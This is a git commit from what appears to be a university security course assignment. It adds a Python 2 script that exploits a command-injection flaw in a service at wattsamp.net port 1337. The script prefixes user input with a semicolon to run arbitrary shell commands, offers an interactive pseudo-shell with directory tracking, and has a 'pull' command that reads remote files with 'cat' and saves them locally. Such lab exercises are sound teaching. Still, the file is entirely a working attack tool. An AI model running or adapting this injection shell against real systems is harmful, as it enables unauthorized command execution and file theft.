28084c9cc39709e5994ef1be2aae36630978d8ab
Andrew Figlarz <afiglarz@terpmail.umd.edu>
2019-10-03 21:42:34 -0400

    completed assignment 4

---
+++ week/4/writeup/stub.py
@@ -0,0 +1,93 @@
+import socket
+import time
+
+host = "wattsamp.net" # IP address here
+port = 1337 # Port here
+
+def execute_cmd(cmd):
+        
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    
+    data = s.recv(1024)     # Receives 1024 bytes from IP/Port
+
+    time.sleep(1)
+   
+    s.send("; " + cmd + "\n")
+
+    time.sleep(2)
+    
+    data = s.recv(1024)
+    
+    time.sleep(1)
+    
+    print(data)
+
+
+def execute_dl(remotepath, localpath):
+        
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    
+    data = s.recv(1024)     # Receives 1024 bytes from IP/Port
+
+    time.sleep(1)
+   
+    s.send("; " + "cat " + remotepath + "\n")
+
+    time.sleep(2)
+    
+    data = s.recv(1024)
+    
+    time.sleep(1)
+
+    f = open(localpath + "/result.txt", "w+")
+    f.write(data)
+    f.close()
+    
+    print(data)
+
+
+if __name__ == '__main__':
+    pm = "shell Drop into an interactive shell and allow users to gracefully exit\npull <remote-path> <local-path> Download files\nhelp Shows this help menu\nquit Quit the shell"
+    print(pm)
+
+    arg = raw_input()
+
+    while arg != "quit":
+        text = arg.split()
+        
+        if arg != "shell" and text[0] != "pull" and arg != "quit":
+            print(pm)
+            arg = raw_input()
+
+        if arg == "shell":
+            prev_i = "/"
+            print(prev_i + ">")
+            prev = prev_i
+
+            while arg != "quit":
+                arg = raw_input()
+                text = arg.split()
+
+                if text[0] == "cd" and len(text) == 1:
+                    prev = prev_i
+                    print (prev + ">")
+                
+                elif text[0] == "cd" and len(text) == 2:
+                    prev = prev + "/" + text[1]
+                    print (prev + ">")
+                    
+                elif text[0] != "quit":
+                    execute_cmd("cd " + prev + "; " + text[0])
+                    print (prev + ">")
+
+            arg = "hey TAs :3"
+ 
+        if text[0] == "pull":
+            remotepath = text[1]
+            localpath = text[2]
+
+            execute_dl(remotepath, localpath)
+          
+            arg = "hey TAs :3"
